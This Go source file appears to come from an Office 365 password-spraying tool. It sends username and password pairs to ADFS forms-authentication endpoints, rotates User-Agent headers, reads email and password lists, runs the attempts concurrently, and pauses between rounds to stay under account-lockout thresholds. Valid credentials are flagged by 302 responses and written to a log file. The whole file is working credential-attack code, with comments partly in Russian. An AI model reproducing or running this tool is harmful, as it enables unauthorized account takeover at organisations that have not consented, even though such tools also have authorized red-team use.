package spray

import (
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
	"sync"

	"github.com/fatih/color"
	"github.com/lexcf/o365sprayer/o365sprayer/constants"
	"github.com/lexcf/o365sprayer/o365sprayer/logging"
)

func SprayADFSO365(
	domainName string,
	authURL string,
	email string,
	password string,
	command string,
	file *os.File,
) {

	defer func() {
		// Recover from panic and log the error if any
		if r := recover(); r != nil {
			color.Red("[!] Panic occurred: %v", r)
			log.Println("[!] Panic: ", r)
		}
	}()

	adfsLogin := url.Values{}
	adfsLogin.Add("AuthMethod", "FormsAuthentication")
	adfsLogin.Add("UserName", email)
	adfsLogin.Add("Password", password)
	loginURL := strings.Replace(authURL, "UsErNaMe%40"+domainName, email, 1)
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}}
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(adfsLogin.Encode()))
	req.Header.Add("User-Agent", constants.USER_AGENTS[rand.Intn(len(constants.USER_AGENTS))])
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		// If error making the HTTP request, log it and return
		color.Red("[!] Error during request: %v", err)
		log.Println("[!] Error during request:", err)
		return
	}
	defer resp.Body.Close()
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == 302 {
		go sprayCounter()
		color.Green("[+] Valid Credential : " + email + " - " + password)
		logging.LogSprayedAccount(file, email, password)
	}
	if resp.StatusCode != 302 && command == "standalone" {
		color.Red("[+] Invalid Credential : " + email + " - " + password)
	}
}


//TODO multithreading
func SprayEmailsADFSO365(
	domainName string,
	authURL string,
	email string,
	emailFilePath string,
	password string,
	passwordFilePath string,
	delay float64,
	lockout int,
	lockoutDelay int,
	maxLockouts int,
	threads int,
) {

	semaphore := make(chan struct{}, threads)
	var wg sync.WaitGroup
	semaphore <- struct{}{}
	wg.Add(1)
	go func() {
		defer func() {
			<-semaphore
			wg.Done()
		}()

	color.Yellow("[+] Spraying For O365 Emails - ADFS")
	timeStamp := strconv.Itoa(time.Now().Year()) + strconv.Itoa(int(time.Now().Month())) + strconv.Itoa(int(time.Now().Hour())) + strconv.Itoa(int(time.Now().Minute())) + strconv.Itoa(int(time.Now().Second()))
	fileName := domainName + "_spray_" + timeStamp
	logFile, err := os.OpenFile((fileName), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Could not open " + fileName)
		return
	}
	defer logFile.Close()
	if len(email) > 0 {
		if len(password) > 0 {
			SprayADFSO365(
				domainName,
				authURL,
				email,
				password,
				"standalone",
				logFile,
			)
		}
		if len(password) == 0 && len(passwordFilePath) > 0 {
			var lockoutCount = 0
			file, err := os.Open(passwordFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				if lockoutCount == (lockout - 1) {
					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
					lockoutCount = 0
				}
				lockoutCount += 1
				SprayADFSO365(
					domainName,
					authURL,
					email,
					scanner.Text(),
					"file",
					logFile,
				)
				time.Sleep(time.Duration(delay))
			}
			if err := scanner.Err(); err != nil {
				log.Fatal(err)
			}
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
	}
	if len(email) == 0 && len(emailFilePath) > 0 {
		if len(password) > 0 {
			file, err := os.Open(emailFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			scanner := bufio.NewScanner(file)

			// Создаем канал с размерами буфера, чтобы ограничить количество одновременно работающих горутин
			concurrentLimit := threads
			sem := make(chan struct{}, concurrentLimit)

			// Для ожидания завершения всех горутин
			var wg sync.WaitGroup

			// Считываем строки из файла
			for scanner.Scan() {
				// Запускаем горутину для каждой строки
				wg.Add(1)
				go func(email string) {
					defer wg.Done()

					// Пытаемся захватить место в канале (блокирует, если превышен лимит)
					sem <- struct{}{}
					defer func() { <-sem }() // Освобождаем место в канале после завершения работы горутины

					SprayADFSO365(
						domainName,
						authURL,
						email,
						password,
						"file",
						logFile,
					)

				}(scanner.Text())

				// Небольшая пауза для имитации задержки, можно настроить в зависимости от необходимости
				//time.Sleep(10 * time.Millisecond)
				time.Sleep(time.Duration(delay))
			}

			if err := scanner.Err(); err != nil {
				log.Fatal(err)
			}

			wg.Wait()

			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
		if len(password) == 0 && len(passwordFilePath) > 0 {
			lockoutCount := 0
			passFile, err := os.Open(passwordFilePath)
			if err != nil {
				log.Fatal(err)
			}
			defer passFile.Close()
			passScanner := bufio.NewScanner(passFile)

			// Канал для ограничения количества горутин
			concurrentLimit := threads
			sem := make(chan struct{}, concurrentLimit)

			// WaitGroup для ожидания завершения всех горутин
			var wg sync.WaitGroup

			for passScanner.Scan() {
				if lockoutCount == (lockout - 1) {
					color.Blue("[+] Cooling Down Lockout Time Period For " + strconv.Itoa(lockoutDelay) + " minutes")
					time.Sleep(time.Duration(lockoutDelay) * time.Minute)
					lockoutCount = 1
				}
				lockoutCount += 1
				emailFile, err := os.Open(emailFilePath)
				if err != nil {
					log.Fatal(err)
				}
				defer emailFile.Close()
				emailScanner := bufio.NewScanner(emailFile)

				
				for emailScanner.Scan() {
					wg.Add(1)

					// Запускаем горутину для обработки каждой строки email
					go func(email string, password string) {
						defer wg.Done()

						// Захватываем слот в канале
						sem <- struct{}{}
						defer func() { <-sem }() // Освобождаем слот после выполнения горутины

						// Выполняем SprayADFSO365
						SprayADFSO365(domainName, authURL, email, password, "file", logFile)

						// Пауза для имитации задержки
						time.Sleep(time.Duration(delay))
					}(emailScanner.Text(), passScanner.Text())
				}
				if err := emailScanner.Err(); err != nil {
					log.Fatal(err)
				}
			}
			if err := passScanner.Err(); err != nil {
				log.Fatal(err)
			}
			wg.Wait()
			if sprayedUsers > 0 {
				color.Yellow("[+] " + strconv.Itoa(sprayedUsers) + " Valid O365 Credentials Found !")
			} else {
				color.Red("[-] No Valid O365 Credentials Found !")
			}
		}
	}

	}()

	wg.Wait()
}
